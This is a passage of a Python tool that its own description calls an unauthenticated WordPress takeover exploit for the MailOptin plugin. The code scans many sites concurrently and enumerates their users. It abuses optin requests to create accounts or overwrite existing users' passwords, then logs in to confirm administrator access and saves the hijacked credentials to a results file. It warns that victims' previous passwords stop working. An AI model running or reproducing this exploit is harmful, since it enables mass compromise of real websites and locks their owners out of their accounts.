    with open(answer, "r", encoding="utf-8-sig", errors="replace") as fh:
        for raw in fh:
            line = raw.strip().lstrip("\ufeff").strip()
            if line and not line.startswith("#") and not line.startswith("//"):
                lines.append(line)
    return answer, lines


# =============================================================================
# rich helpers
# =============================================================================

def make_console() -> Optional["Console"]:
    return Console(highlight=False) if RICH else None


def say(console: Optional["Console"], message: str = "") -> None:
    if console:
        console.print(message)
    else:
        print(re.sub(r"\[/?[a-z ]+\]", "", message))


def hits_table(console: Optional["Console"], hits: List[Hit]) -> None:
    if not console:
        for hit in hits:
            print("  " + hit.line)
        return
    table = Table(box=box.ROUNDED, border_style="green", show_lines=True,
                  title="confirmed accounts", title_style="bold green")
    table.add_column("results-file line", style="bold white", overflow="fold")
    table.add_column("mode", style="cyan")
    table.add_column("cid", justify="right", style="magenta")
    table.add_column("uid", justify="right", style="magenta")
    table.add_column("access", style="bold")
    for hit in hits:
        table.add_row(hit.line, hit.mode, str(hit.campaign_id),
                      str(hit.user_id if hit.user_id is not None else "-"),
                      "[bold green]ADMIN[/]" if hit.administrator
                      else "[yellow]member[/]")
    console.print(table)


# =============================================================================
# per-target work
# =============================================================================

async def run_site(target: Target, args, threads: int, log: VulnLog,
                   console: Optional["Console"], memory: CampaignMemory,
                   secret: str, password: str, emails: Dict[str, str],
                   login_for: str) -> SiteResult:
    """
    Everything for one target. Discovery is concurrent, the attack sweep is
    batched, and verification is sequential so the cookie jar stays coherent.
    """
    result = SiteResult(target)
    inner = max(2, min(threads, 8))          # per-target request concurrency
    try:
        async with Client(target, timeout=args.timeout,
                          insecure=args.insecure) as client:
            # No "is this WordPress" gate - the first request is discovery.
            users, counts = await discover_users(client, args.max_users, inner)
            result.counts = counts
            result.users = [users[uid] for uid in sorted(users)]
            by_uid = {u.uid: u for u in result.users}

            if not users and args.mode == "takeover":
                # Only takeover needs a victim: CREATE just needs a campaign
                # id, so a site whose users cannot be enumerated is still
                # worth a create attempt instead of being written off.
                result.note = "no users found"
                result.requests = client.requests
                return result

            order = [u.uid for u in result.users]
            campaigns = memory.ordered(args.max_campaigns)
            pairs: List[Tuple[int, Optional[int]]] = []
            # TAKEOVER first: it is the only path that can yield an
            # administrator. CREATE is capped at the site default role, so it is
            # never allowed to end the scan before takeover has been tried.
            if args.mode in ("takeover", "both"):
                pairs.extend((cid, uid) for cid in campaigns for uid in order)
            if args.mode in ("create", "both"):
                pairs.extend((cid, None) for cid in campaigns)

            if args.dry_run:
                result.note = "dry run, %d candidate(s) planned" % len(pairs)
                result.requests = client.requests
                return result

            sem = asyncio.Semaphore(inner)
            stop = asyncio.Event()
            taken: set = set()            # user ids already rewritten
            created = False              # a CREATE login is now taken
            dead_replies = 0

            async def stage_one(pair):
                """The only write. One optin POST, reply judged immediately."""
                nonlocal dead_replies
                cid, uid = pair
                mode = "CREATE" if uid is None else "TAKEOVER"
                mappings, values, role = stage_one_fields(
                    mode, uid, login_for, password if uid is None else secret)
                async with sem:
                    parsed, status = await send_optin(
                        client, cid, emails.get(mode, uid), mappings, values,
                        role)
                if accepted(parsed):
                    return pair, mode
                # Adaptive bail-out: a target without the plugin answers the
                # same dead way every time, so stop instead of grinding through
                # the rest of the range.
                if parsed is None and status in DEAD_STATUS:
                    dead_replies += 1
                else:
                    dead_replies = 0
                return None

            async def stage_two(pair, mode) -> Optional[Hit]:
                """
                Proof. SEQUENTIAL - concurrent logins on one cookie jar log each
                other out. The username is read back from the account itself
                after logging in, never guessed from the id that was attacked.
                """
                cid, uid = pair
                address = emails.get(mode, uid)
                identifier = login_for if mode == "CREATE" else address
                access = await login_and_classify(client, identifier, password)
                if access == ANON:
                    return None
                profile = await read_profile(client)

                # Identity guard. The session must belong to the account this
                # pair attacked; if it does not, the credential on record would
                # be somebody else's, so the hit is discarded rather than
                # written out with the wrong name.
                if (uid is not None and profile.user_id is not None
                        and profile.user_id != uid):
                    result.note = ("session id %d does not match targeted id %d"
                                   % (profile.user_id, uid))
                    return None

                username, source = await resolve_username(
                    client, profile, uid, by_uid, identifier)
                if mode == "CREATE" or uid is None:
                    role_note = "site default (editor)"
                    if username is None:
                        username, source = identifier, "created login"
                else:
                    role_note = "role preserved"
                if username is None:
                    # Nothing authoritative answered. Say so plainly instead of
                    # inventing a name that would look like a real username.
                    username, source = "uid-%s" % uid, "UNRESOLVED"
                    role_note = "role preserved; USERNAME UNRESOLVED"

                return Hit(site=target.base, login_url=target.login_url,
                           username=username, password=password, mode=mode,
                           campaign_id=cid, user_id=uid,
                           email=profile.user_email or address,
                           access=access,
                           detail="%s; user via %s" % (role_note, source))

            index = 0
            while index < len(pairs) and not stop.is_set():
                if dead_replies >= args.dead_limit:
                    result.note = ("endpoint not answering after %d replies"
                                   % dead_replies)
                    break
                window = [p for p in pairs[index:index + args.batch]
                          if not (p[1] is not None and p[1] in taken)
                          and not (p[1] is None and created)]
                index += args.batch
                if not window:
                    continue
                survivors = [r for r in await asyncio.gather(
                    *(stage_one(p) for p in window)) if r]
                for pair, mode in survivors:
                    memory.record(pair[0])
                    hit = await stage_two(pair, mode)
                    if not hit:
                        continue
                    if await log.write(hit, console):
                        result.hits.append(hit)
                    # A user that just changed hands is not retried against the
                    # remaining campaigns, and a created login cannot be created
                    # twice.
                    if mode == "CREATE":
                        created = True
                    else:
                        taken.add(pair[1])
                    # Default: keep going until an administrator appears, because
                    # a member-level hit is usually not the best one available.
                    # --all stops at the first hit of any level.
                    if hit.administrator or args.all:
                        stop.set()

            if result.hits:
                result.note = "%d account(s)" % len(result.hits)
            elif not result.note:
                result.note = ("nothing written in %d campaign(s)"
                               % len(campaigns))
            result.requests = client.requests
            return result
    except Exception as exc:                       # noqa: BLE001
        result.note = "error: %s" % exc
        return result


# =============================================================================
# main
# =============================================================================

async def run() -> int:
    ap = argparse.ArgumentParser(
        description="MailOptin unauthenticated WordPress takeover, "
                    "multi-target (single file, aiohttp + rich)")
    ap.add_argument("--urls", help="file with one target URL per line; "
                                   "asked for if omitted")
    ap.add_argument("--url", help="single target, skips the list prompt")
    ap.add_argument("--threads", type=int,
                    help="targets scanned at once (asked for if omitted)")
    ap.add_argument("--out", default="vulns.txt",
                    help="results file, one line per hit "
                         "(default: %(default)s)")
    ap.add_argument("--password", default="", help="password to set")
    ap.add_argument("--email", default="",
                    help="e-mail template; {host} and {mode} are replaced")
    ap.add_argument("--login", default="",
                    help="new-account name template; {host} is replaced")
    ap.add_argument("--max-campaigns", type=int, default=40)
    ap.add_argument("--max-users", type=int, default=40)
    ap.add_argument("--batch", type=int, default=8,
                    help="campaigns probed per verification round "
                         "(default: %(default)s)")
    ap.add_argument("--dead-limit", type=int, default=8,
                    help="give up on a target after this many unanswered "
                         "replies in a row (default: %(default)s)")
    ap.add_argument("--mode", choices=["create", "takeover", "both"],
                    default="both")
    ap.add_argument("--plain-pass", action="store_true",
                    help="deprecated and ignored: CREATE always sends plaintext, "
                         "TAKEOVER can only send a phpass hash")
    ap.add_argument("--all", action="store_true",
                    help="stop at the first hit of any level, not just admin")
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--yes", action="store_true",
                    help="accept every default instead of prompting")
    ap.add_argument("--dry-run", action="store_true",
                    help="discover users only, write nothing")
    args = ap.parse_args()

    console = make_console()
    say(console)
    say(console, "[bold red]MailOptin - unauthenticated WordPress takeover[/]")
    say(console, "[dim]one line per hit in %s[/]" % os.path.abspath(args.out))
    say(console)
    if args.plain_pass:
        say(console, "[yellow]--plain-pass is ignored: CREATE always sends "
                     "plaintext, TAKEOVER can only send a phpass hash[/]")

    # ---- questions -------------------------------------------------------
    if args.url:
        list_path, list_lines = None, [args.url]
    elif args.urls:
        list_path, list_lines = ask_target_list(args.urls, assume=args.yes)
    else:
        list_path, list_lines = ask_target_list(None, assume=args.yes)
    if not list_lines and not args.url:
        say(console, "[red]no targets loaded[/]")
        return 2

    threads = args.threads if args.threads else ask("threads [16]: ", "16", int,
                                                  assume=args.yes)
    threads = max(1, min(threads, 128))

    # ---- targets ---------------------------------------------------------
    targets: List[Target] = []
    seen = set()
    for line in list_lines:
        target = parse_target(line)
        if target is None:
            continue
        key = target.base.lower()
        if key in seen:
            continue
        seen.add(key)
        targets.append(target)
    if not targets:
        say(console, "[red]no valid targets in the list[/]")
        return 2

    password = args.password or "Pwn3d-MailOptin-2026"
    # CREATE and TAKEOVER must not share an e-mail: the takeover writes that
    # address onto an existing account and wp_insert_user() refuses an update
    # whose e-mail already belongs to somebody else. The random tag also lets
    # the same target be scanned twice in a row.
    tag = "%04x" % random.SystemRandom().randrange(0x10000)
    email_tpl = args.email or "poc_{mode}_{uid}@{host}"
    login_tpl = args.login or "poc_{host}_%s" % tag
    # The takeover password travels pre-hashed, and it MUST: the connection
    # stores user_pass verbatim, so a plaintext here leaves an account whose
    # password can never be verified by wp_check_password(). CREATE is the
    # opposite case and always sends plaintext (see the stage_one_fields call).
    secret = phpass_hash(password)

    if console:
        console.print(Panel(
            "[bold]targets[/]  %d from %s\n"
            "[bold]threads[/]  %d at a time\n"
            "[bold]password[/] %s\n"
            "[bold]results[/]  %s\n\n"
            "[yellow]This creates or rewrites real WordPress accounts. On an "
            "existing account the previous password stops working immediately.[/]"
            % (len(targets), list_path or "command line", threads, password,
               os.path.abspath(args.out)),
            box=box.ROUNDED, border_style="yellow"))

    if not phpass_selftest():
        say(console, "[red]phpass self-test FAILED - refusing to run[/]")
        return 2
    say(console, "[green]ok[/] phpass matches WordPress (%d vectors)"
        % len(PHPASS_VECTORS))
    say(console, "[dim]no username wordlist - every user is found through "
                 "WordPress itself[/]")

    log = VulnLog(args.out)
    await log.header("targets=%d threads=%d mode=%s campaigns=%d"
                     % (len(targets), threads, args.mode, args.max_campaigns))

    memory = CampaignMemory()
    queue: asyncio.Queue = asyncio.Queue()
    for target in targets:
        queue.put_nowait(target)
    all_hits: List[Hit] = []
    wp_found = 0
    prog = None
    prog_task = None

    async def worker() -> None:
        nonlocal wp_found
        while True:
            try:
                target = queue.get_nowait()
            except asyncio.QueueEmpty:
                return
            host = target.host
            emails = Mailbox(email_tpl.replace("{host}", host))
            try:
                result = await run_site(
                    target, args, threads, log, console, memory, secret,
                    password, emails, login_tpl.replace("{host}",
                                                       slugify(host)))
            except Exception as exc:                  # noqa: BLE001
                say(console, "  [red]%s error: %s[/]" % (target.base, exc))
                if prog is not None:
                    prog.advance(prog_task)
                continue
            counts = result.counts or {}
            if counts.get("total"):
                wp_found += 1
            found = "rest %d / sitemap %d / author %d" % (
                counts.get("rest", 0), counts.get("sitemap", 0),
                counts.get("author", 0))
            mark = ("[bold green]HIT [/]" if result.hits else
                    "[cyan]dry [/]" if args.dry_run else "[dim]--- [/]")
            say(console, "  %s[bold]%-40s[/] users=%-3d %-30s %s"
                % (mark, target.base, counts.get("total", 0), found,
                   result.note))
            all_hits.extend(result.hits)
            if prog is not None:
                prog.advance(prog_task)

    workers = min(threads, len(targets))
    if console:
        with Progress(SpinnerColumn(spinner_name=SPINNER),
                      TextColumn("[cyan]scanning targets"),
                      BarColumn(), MofNCompleteColumn(),
                      TimeElapsedColumn(), console=console) as bar:
            prog = bar
            prog_task = bar.add_task("targets", total=len(targets))
            await asyncio.gather(*(worker() for _ in range(workers)))
    else:
        await asyncio.gather(*(worker() for _ in range(workers)))

    # ---- verdict ---------------------------------------------------------
    elapsed = time.time() - STARTED
    say(console)
    if all_hits:
        hits_table(console, all_hits)
    admins = [h for h in all_hits if h.administrator]

    if console:
        if admins:
            body = ("[bold green]VERIFIED[/] unauthenticated administrator "
                    "access on %d of %d target(s) that answered"
                    % (len({h.site for h in admins}), wp_found))
            style = "green"
        elif args.dry_run:
            body = ("[cyan]DRY RUN[/] %d target(s) probed, %d answered.\n"
                    "Users were discovered. Nothing was written - drop "
                    "--dry-run to attack." % (len(targets), wp_found))
            style = "cyan"
        elif all_hits:
            body = ("[bold yellow]PARTIAL[/] %d account(s) on %d target(s), "
                    "none administrator.\nNo campaign published "
                    "'administrator', so Subscription.php:62 replaced the role."
                    % (len(all_hits), len({h.site for h in all_hits})))
            style = "yellow"
        else:
            body = ("[bold red]nothing worked[/]\n%d of %d target(s) answered. "
                    "Either no %s campaign exists in the range tried, or every "
                    "candidate was lead_bank_only and answered success without "
                    "writing - try a higher --max-campaigns."
                    % (wp_found, len(targets), WPCONN))
            style = "red"
        console.print(Panel(body, box=box.HEAVY, border_style=style))
        console.print("[dim]%d line(s) in %s  |  %d target(s)  |  %.1fs[/]"
                      % (log.count, os.path.abspath(args.out), len(targets),
                         elapsed))
    else:
        print("\n%d line(s) in %s  |  %d target(s)  |  %.1fs"
              % (log.count, os.path.abspath(args.out), len(targets), elapsed))

    if admins:
        return 0
    if all_hits:
        return 7
    return 5


if __name__ == "__main__":
    try:
        sys.exit(asyncio.run(run()))
    except KeyboardInterrupt:
        sys.stderr.write("\ninterrupted - anything already proven is in the "
                         "results file\n")
        sys.exit(130)
    except Exception as exc:                       # noqa: BLE001
        import traceback
        traceback.print_exc()
        sys.stderr.write("[FATAL] %s\n" % exc)
        sys.exit(1)
